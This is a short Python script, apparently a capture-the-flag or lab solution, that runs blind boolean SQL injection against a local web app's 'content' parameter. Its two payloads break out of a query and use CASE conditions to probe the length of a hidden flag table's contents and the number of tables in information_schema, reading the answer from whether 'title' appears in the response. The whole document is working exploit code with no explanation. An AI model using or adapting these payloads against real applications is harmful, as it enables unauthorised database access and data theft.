import requests


url = "http://127.0.0.1:9000/vul/"

id = 1
content_param = f"/?content="
content = "IS_FREE!"

work_payload = """
-\\>') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when 
(SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) < 20 
then true 
else false 
end GROUP BY "vul_blog"."title" LIMIT 1 offset 1 --
"""

schema_count_payload = """
-\\>') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when 
(SELECT count(table_name) as cnt FROM information_schema.tables WHERE table_schema='public') < 2 
then true 
else false 
end  LIMIT 1 offset 1 --
"""

def exists_check(content):
    if "title" in str(content):
        return True
    else:
        return False


'''
url = f"{url}{id}{content_param}{content}"
resp = requests.get(url=url)

print(exists_check(resp.content))
'''


url = f"{url}{id}{content_param}{schema_count_payload}"
resp = requests.get(url=url)
print(exists_check(resp.content))
